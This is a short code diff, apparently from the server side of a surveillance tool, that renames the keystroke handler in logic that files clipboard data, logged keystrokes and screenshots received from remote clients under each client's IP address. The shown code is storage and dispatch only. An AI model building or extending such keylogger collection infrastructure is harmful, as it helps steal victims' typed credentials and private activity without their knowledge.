@@ -18,7 +18,7 @@ def save_clipboard_data(client_dir, data):
         log(f"Failed to save clipboard data: {e}", "ERROR", "filesystem")
 
 
-def save_keystroke_data(client_dir, data):
+def save_keystrokes_data(client_dir, data):
     file_path = os.path.join(client_dir, "keystrokes.txt")
     entry = (
         f"[{data['timestamp']}]\n"
@@ -61,9 +61,9 @@ def save_cached_data(client_dir, data):
     if data_type == "clipboard":
         data["data"]["timestamp"] = original_timestamp
         save_clipboard_data(client_dir, data["data"])
-    elif data_type == "keystroke":
+    elif data_type == "keystrokes":
         data["data"]["timestamp"] = original_timestamp
-        save_keystroke_data(client_dir, data["data"])
+        save_keystrokes_data(client_dir, data["data"])
     elif data_type == "screenshot":
         # For screenshots, we already use the timestamp in the filename
         save_screenshot_data(client_dir, data)
@@ -78,8 +78,8 @@ def handle_data(client_ip, payload):
 
         if data_type == "clipboard":
             save_clipboard_data(client_dir, payload["data"])
-        elif data_type == "keystroke":
-            save_keystroke_data(client_dir, payload["data"])
+        elif data_type == "keystrokes":
+            save_keystrokes_data(client_dir, payload["data"])
         elif data_type == "screenshot":
             save_screenshot_data(client_dir, payload)
         else:
